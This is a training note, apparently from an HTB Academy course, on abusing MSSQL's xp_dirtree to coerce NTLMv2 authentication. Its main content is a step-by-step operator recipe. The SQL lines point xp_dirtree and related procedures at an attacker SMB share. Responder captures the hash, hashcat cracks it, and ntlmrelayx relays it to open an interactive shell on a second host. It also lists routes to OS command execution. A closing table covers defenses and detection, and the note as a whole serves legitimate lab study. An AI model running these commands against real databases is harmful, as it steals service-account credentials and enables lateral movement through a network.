# Latest SQL Vulnerabilities — `xp_dirtree` NTLMv2 Coercion

> HTB Academy · Attacking Common Services · Section 10 / 19
> Companion to [09-Attacking_SQL_Databases.md](09-Attacking_SQL_Databases.md)

This is **not a CVE** and not a memory-corruption exploit. It is a misuse of a legitimate, undocumented MSSQL extended stored procedure that turns any authenticated low-priv SQL user into an NTLMv2 capture / SMB relay primitive against the database server's service account.

---

## TL;DR

| Step | What | Why It Works |
|------|------|--------------|
| 1 | SQL user calls `EXEC master..xp_dirtree '\\ATTACKER\share\'` | `xp_dirtree` walks any path, including UNC, in MSSQL's process context |
| 2 | MSSQL host opens SMB to attacker | Windows auto-sends NTLMv2 of the **service account** (`mssqlsvc`) when reaching out over SMB |
| 3 | Attacker (Responder/tcpdump/Wireshark) captures the NTLMv2 challenge/response | SMB authentication is implicit — no user interaction |
| 4 | Hash is cracked offline **or** SMB-relayed to another host | Service accounts often share creds across the estate |

Triggerable by **any** authenticated SQL principal — `xp_dirtree` does not require `sysadmin`.

---

## Why This Is An "Attack" Without Being A "Vulnerability"

- `xp_dirtree` is undocumented but shipped by Microsoft. It is intended for directory listing, local or remote.
- The "vulnerability" lives in **Windows SMB authentication semantics**, not in MSSQL: any process that touches `\\host\share` sends the caller's Kerberos/NTLM credentials.
- Microsoft patched the legacy variant where the relay could go **back to the originating host** (MS08-068). Cross-host relay is still possible.
- Equivalent primitives: `xp_subdirs`, `xp_fileexist`, `xp_getfiledetails`, plus `BULK INSERT` / `OPENROWSET(BULK ...)` against UNC paths.

---

## The Concept of the Attack — Source / Process / Privileges / Destination

### Phase 1: Initiation (`xp_dirtree`)

| # | Element | Mapping |
|---|---------|---------|
| 1 | Source | User-supplied UNC path passed to `xp_dirtree` |
| 2 | Process | MSSQL enumerates folder contents and serializes the result to the client |
| 3 | Privileges | The OS-level access uses the **MSSQL service account** (`mssqlsvc`), not the SQL principal |
| 4 | Destination | Windows SMB redirector dispatches an outbound SMB session to the attacker share |

### Phase 2: Stealing the Hash

| # | Element | Mapping |
|---|---------|---------|
| 5 | Source | Inbound SMB connection from the MSSQL host |
| 6 | Process | Attacker SMB listener (Responder) responds to the negotiate / session setup |
| 7 | Privileges | The DB host transparently sends the NTLMv2 response of the service account |
| 8 | Destination | Attacker-controlled "share" — the response is logged and printed to disk |

---

## Operator Recipe

### 1. Confirm Reachability

```bash
nmap -sV -p1433,445 <target>
nxc mssql <target> -u <user> -p <pass> -q "SELECT @@version;"
```
> Confirms MSSQL is running and your credentials work before proceeding. Replace `<target>`, `<user>`, and `<pass>` with your target's values. `-q` runs a SQL query non-interactively.

### 2. Stage the Listener

```bash
# Free port 445 first — kill any ntlmrelayx / smbd / stale Responder
sudo ss -tlnp | grep -E ':(139|445)\b'
sudo kill <PID>

# Listen for inbound SMB auth and capture NTLMv2
sudo responder -I tun0 -wv
```
> Always free ports 139 and 445 before starting Responder — any conflict silently prevents hash capture. Replace `tun0` with your VPN interface. `-w` enables WPAD, `-v` verbose output.

### 3. Trigger the Coercion

Inside the MSSQL session (any privilege level):

```sql
EXEC master..xp_dirtree '\\10.10.14.5\share\', 1, 1;
-- Alternates:
EXEC master..xp_subdirs '\\10.10.14.5\share\';
EXEC master..xp_fileexist '\\10.10.14.5\share\anything';
```
> Replace `10.10.14.5` with your tun0 IP. The second and third args to xp_dirtree (depth and files flag) can be omitted. Any of the three alternates triggers the SMB auth — pick whichever the target allows.

`impacket-mssqlclient` one-liner from Linux:

```bash
impacket-mssqlclient <user>:<pass>@<target> \
  -windows-auth \
  -q "EXEC master..xp_dirtree '\\\\10.10.14.5\\share\\', 1, 1;"
```
> `-q` runs the query non-interactively. Double-escape the backslashes in the shell (`\\\\` becomes `\\` in the SQL string). Replace `<user>:<pass>@<target>` and the attacker IP with your values.

### 4. Harvest

Responder prints the NTLMv2-SSP block:

```
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : MSSQLSVC::WIN-02:<challenge>:<HMAC>:<blob>
```

Save and crack:

```bash
hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 mssqlsvc.hash --show
```
> `-m 5600` targets NTLMv2 hashes. After cracking, `--show` displays the plaintext. Replace `mssqlsvc.hash` with the path to your saved hash file.

### 5. Relay (Alternative to Cracking)

If SMB signing is **not enforced** on a different host where `mssqlsvc` (or whatever account answers) has rights:

```bash
sudo impacket-ntlmrelayx -smb2support -t smb://<other-host> -i
# Then trigger xp_dirtree → relayed session lands on <other-host>
```
> `-smb2support` handles SMBv2. `-t` is the relay target (a different host from the source). `-i` opens an interactive SMB shell on the relay target. Replace `<other-host>` with the target IP that lacks SMB signing.

Goal: obtain admin on a **second** host, then pivot back to the original DB box by reusing harvested credentials (Microsoft killed self-relay).

---

## Detection / Defense Quick Reference

| Control | Effect |
|---------|--------|
| `sp_configure 'xp_dirtree'` removal / DENY EXECUTE on extended SPs to non-sysadmins | Removes the primitive for low-priv logins |
| Egress firewall blocking outbound SMB (TCP 445) from DB servers | Coercion call hangs / fails — no hash leaks |
| **SMB signing required** on all servers | Neutralizes relay; cracking still possible |
| Run MSSQL as a low-privilege **gMSA** with no network rights | Service account hash becomes useless if cracked |
| Monitor `4624 / 4625` events for `mssqlsvc` outbound auth, MSSQL audit on extended SP execution | Detection of the coercion |

---

## Other "Code Execution" Primitives in MSSQL (For Awareness)

Out of scope for this section but worth noting — you can pivot a SQL session into OS-level execution through:

- `xp_cmdshell` (requires `sysadmin` + enable)
- `sp_OACreate` / OLE Automation procs
- CLR assemblies (`CREATE ASSEMBLY` + `CREATE PROCEDURE`)
- Embedded **Python** / **R** via `sp_execute_external_script` (Machine Learning Services)
- Agent jobs (`msdb.dbo.sp_add_job`) for persistence and scheduled execution

These typically require elevated privileges; `xp_dirtree` is unique in that it gives a credential-leak primitive **without** them.

---

## Cross-References

- Section 7 — [SMB attacks & relay fundamentals](07-Attacking_SMB.md)
- Section 9 — [Attacking SQL Databases](09-Attacking_SQL_Databases.md) (full lab walkthrough using exactly this technique against `WIN-02`)

## Key Takeaways

- `xp_dirtree` is a credential-leak primitive available to any authenticated SQL user.
- The leaked hash belongs to the **OS service account**, not the SQL login — service accounts are typically more valuable.
- Two endgames: **offline crack** (hashcat -m 5600) or **online relay** (ntlmrelayx, requires no SMB signing on a different target).
- Defense is layered: deny extended-SP execution, block outbound SMB from DB tier, enforce SMB signing, monitor for outbound auth from `mssqlsvc`.
